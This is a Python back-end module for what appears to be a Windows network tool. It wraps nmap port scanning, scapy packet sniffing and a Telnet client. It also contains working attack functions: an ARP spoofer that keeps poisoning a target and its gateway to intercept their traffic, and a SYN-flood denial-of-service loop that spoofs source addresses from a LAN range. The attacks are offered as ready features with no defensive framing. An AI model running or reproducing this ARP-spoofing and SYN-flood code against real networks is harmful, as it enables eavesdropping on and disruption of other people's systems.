"""
@autor: MBI
Description: Script for Back-end development
"""
#==== Packs ===# 
import nmap
from scapy.all import (ARP,sniff,RandShort,IP,TCP,getmacbyip,send)
from telnetlib import Telnet
import logging
from ipaddress import IPv4Network
from collections import deque
from scapy.arch.windows import get_windows_if_list

#==== Class ====#

class NetworkBackend():
    def __init__(self) -> None:
        self.nmapPort = nmap.PortScanner()
        self.iface = get_windows_if_list()
        self.listIface = [self.iface[id]['name'] for id in range(0,len(self.iface))]
        self.sniff = True
        self.arp = True
        self.dos = True
        logging.getLogger('scapy.rutime').setLevel(logging.ERROR)
        
        
        self.package = deque(maxlen=1)
       
    def networkScan(self,host:str,cmd:str="") -> dict:
        return self.nmapPort.scan(hosts=host,arguments=cmd)

    def returnPackages(self,package)-> str:
        self.package.append(package[1])

   
    def networkSniff(self,iface:str,filter:str='') -> None:
        while self.sniff:
            sniff(filter=filter,iface=iface,prn=self.returnPackages)
        

    def networkTelnetConnect(self,host:str='',port:str='') -> str:
        if (host == '' and port == ''): return 'Select host'
        self.tn = Telnet(host=host,port=port,timeout=5.5)
        return self.networkTelnetRecived()
    
    def networkTelnetRecived(self) -> str:
        recived = self.tn.read_until(match=b'_#>',timeout=1.5)
        if (recived is None): return 'Time out connection'
        return recived.decode('ascii')

    def networkTelnetSend(self,cmd:str='') -> str:
        self.tn.write(cmd.encode('ascii') + b'\n')
        return self.networkTelnetRecived()
    
    def networkArpSpoofer(self,iface:str,targetIp:str,gatewayIp:str) -> None:
        # For target
        spoofingTarget = ARP()
        spoofingTarget.op = 2
        spoofingTarget.psrc = gatewayIp
        spoofingTarget.pdst = targetIp
        spoofingTarget.hwdst = getmacbyip(targetIp) # target mac
        # For gateway
        spoofingGateway = ARP()
        spoofingGateway.op = 2 
        spoofingGateway.psrc = targetIp
        spoofingGateway.pdst = gatewayIp
        spoofingGateway.hwdst = getmacbyip(gatewayIp)

        while self.arp:
            send(spoofingTarget,iface=iface,verbose=False,return_packets=False,inter=0)
            send(spoofingGateway,iface=iface,verbose=False,return_packets=False,inter=0)
        
                
    def networkArpSpooferRestore(self,targetIp:str,gatewayIp:str) -> None:
        hwsrc1 = getmacbyip(gatewayIp)
        hwsrc2 = getmacbyip(targetIp)
        send(ARP(op=2,psrc=gatewayIp,pdst=targetIp,hwdst='ff:ff:ff:ff:ff:ff',
        hwsrc=hwsrc1),count=5,return_packets=False,inter=0,verbose=False)
        send(ARP(op=2,psrc=targetIp,pdst=gatewayIp,hwdst='ff:ff:ff:ff:ff:ff',
        hwsrc=hwsrc2),count=5,return_packets=False,inter=0,verbose=False)

    def networkDos(self,ipTarget:str,portTarget:int,lanSource:str,iface:str) -> None:
        listHost = [host for host in IPv4Network(lanSource).hosts()]
        listHost.pop(0)
        while self.dos:
            send(IP(src=listHost,dst=ipTarget)/TCP(flags='S',sport=RandShort(),
            dport=portTarget),inter=0,iface=iface,realtime=False,verbose=False,return_packets=False)

















